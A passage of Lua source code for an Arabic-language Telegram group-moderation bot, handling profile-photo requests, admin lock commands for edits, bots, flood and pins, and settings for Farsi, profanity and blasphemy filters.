elseif ABSendPhoto[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 6 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 6 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 6 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 7 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 7 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 7 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 8 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 8 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 8 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 9 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 9 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 9 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 10 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 10 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 10 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '11' then
if result.photos_[10] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[10].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 11 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 11 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 11 ) صورة ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '12' then
if result.photos_[11] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[11].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 12 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 12 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 12 ) صورة ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '13' then
if result.photos_[12] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[12].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 13 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 13 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 13 ) صورة ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '14' then
if result.photos_[13] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[13].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 14 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 14 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 14 ) صورة ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '15' then
if result.photos_[14] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[14].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 15 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 15 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 15 ) صورة ", 1, 'md')
end
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ I just can get last 15 profile photos ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لٱ يمكنني ٱرسٱڵ ٱكثر من ( 15 ) صورة ", 1, 'md')
end
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = ABSendPhoto[2]
}, gproen, nil)
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local lockpt = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'       
end
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockpt[2] == "edit" or lockptf[2] == "التعديل" then
if not DevAbs:get(loolIQ..'editmsg'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵتعديڵ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
DevAbs:set(loolIQ..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵتعديڵ بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not DevAbs:get(loolIQ..'farsi'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵفٱرسية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
DevAbs:set(loolIQ..'farsi'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفٱرسية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not DevAbs:get(loolIQ..'farsiban'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵفٱرسية بٱڵطرد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 66, string.len(msg.sender_user_id_))
DevAbs:set(loolIQ..'farsiban'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفٱرسية بٱڵطرد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
if lockpt[2] == "cmd" or lockptf[2] == "الشارحه" then
if not DevAbs:get(loolIQ..'bot:cmds'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock cmd ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵشٱرحة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:cmds'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ cmd is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵشٱرحة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة ', 1, 'md')
end
end
end
if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
if not DevAbs:get(loolIQ..'bot:bots:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock bots ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵبوتٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:bots:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ bots is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵبوتٱت بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة ', 1, 'md')
end
end
end
if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
if not DevAbs:get(loolIQ..'bot:bots:ban'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock bots ban', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵبوتٱت بٱڵطرد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 65, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:bots:ban'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ bots is already locked ban', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵبوتٱت بٱڵطرد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
end
if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
if not DevAbs:get(loolIQ..'keed_bots'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock bots keed ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵبوتٱت بٱڵتقييد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 67, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'keed_bots'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ bots is already locked keed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵبوتٱت بٱڵتقييد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
end
if lockpt[2] == "flood" or lockptf[2] == "التكرار" then
if not DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock flood ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵتكرٱر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'anti-flood:'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ flood is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵتكرٱر بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if lockpt[2] == "pin" or lockptf[2] == "التثبيت" then
if not DevAbs:get(loolIQ..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock pin', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵتثبيت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:pin:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ pin is already locked', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵتثبيت بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('ضع تكرار','Setflood')
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etflood (%d+)$") then
local floodmax = {string.match(text, "^([Ss]etflood) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Select a number greater than 2 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ قـُم بتحډيډ عډډ تكرٱر ٱكبر من 2 ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood sensitivity change to '..floodmax[2]..' ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم وضـع ٱڵـتـكـرٱر \n❗️🔑 ⌯ ڵڵعدد ( '..floodmax[2]..' ) في ٱڵـمجموعة', 1, 'md')
end
DevAbs:set(loolIQ..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('ضع التكرار','Setstatus')
if text:match("^[Ss]etstatus (.*)$") then
local status = {string.match(text, "^([Ss]etstatus) (.*)$")}
if status[2] == "kick" or status[2] == "بالطرد" then
if DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == "Kicked" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Kicked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵتكرٱر بٱڵطرد بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status change to *Kicking* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵتكرٱر بٱڵطرد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالحذف" then
if DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == "DelMsg" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Deleting ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵتكرٱر بٱڵحذف بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status has been change to *Deleting* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵتكرٱر بٱڵحذف \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end
--     Source loolIQ     --
if text:match("^ضع الفارسيه (.*)$") then
local status = {string.match(text, "^(ضع الفارسيه) (.*)$")}
if status[2] == "بالتحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "thhhh" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Kicked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفٱرسية بٱڵتحذير بٱڵتاكيد مۧوضوعة', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status change to *Kicking* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵفٱرسية بٱڵتحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'thhhh')
end
end
if status[2] == "بدون تحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "bedthhh" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Deleting ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفٱرسية بدون تحذير بٱڵتاكيد مۧوضوعة ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status has been change to *Deleting* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵفٱرسية بدون تحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'bedthhh')
end
end
end
--     Source loolIQ     --
if text:match("^ضع الفشار (.*)$") then
local status = {string.match(text, "^(ضع الفشار) (.*)$")}
if status[2] == "بالتحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "fshaerdil" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Kicked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفشٱر بٱڵتحذير بٱڵتاكيد مۧوضوع', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status change to *Kicking* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵفشٱر بٱڵتحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'fshaerdil')
end
end
if status[2] == "بدون تحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "fshaerdil2" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status is *already* on Deleting ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵفشٱر بدون تحذير بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Flood status has been change to *Deleting* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵفشٱر بدون تحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'fshaerdil2')
end
end
end
--     Source loolIQ     --
if text:match("^ضع الكفر (.*)$") then
local status = {string.match(text, "^(ضع الكفر) (.*)$")}
if status[2] == "بالتحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "kfrdil" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Sectarianism by warning certainly activated ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵكفر بٱڵتحذير بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Sectarianism was put into warning ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵكفر بٱڵتحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'kfrdil')
end
end
if status[2] == "بدون تحذير" then
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == "kfrdil2" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Sectarianism with warning certainly disabled ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵكفر بدون تحذير بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Sectarianism was placed without warning ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵكفر بدون تحذير \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'far'..msg.chat_id_,'kfrdil2')
end
end
end
--     Source loolIQ     --
if (text and text == 'enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get('loolIQ:id:photo'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Get id status is *already* on Photo ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱيـدي بٱڵصورة بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Get ID status has been changed to *Photo* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱلٱيـدي بٱڵصورة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
DevAbs:del('loolIQ:id:photo'..msg.chat_id_)
end end end
if (text and text == 'disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get('loolIQ:id:photo'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Get ID status is *already* on Simple ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱيـدي بدون صورة بٱڵتاكيد مۧوضوع ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Get ID status has been change to *Simple* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱلٱيـدي بدون صورة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
DevAbs:set('loolIQ:id:photo'..msg.chat_id_,true)
end end end
if (text and text == 'enable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Enable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get('loolIQ:id:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ID is already enabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱيـدي بٱڵتاكيد مۧفعڵ ', 1, 'md')
end
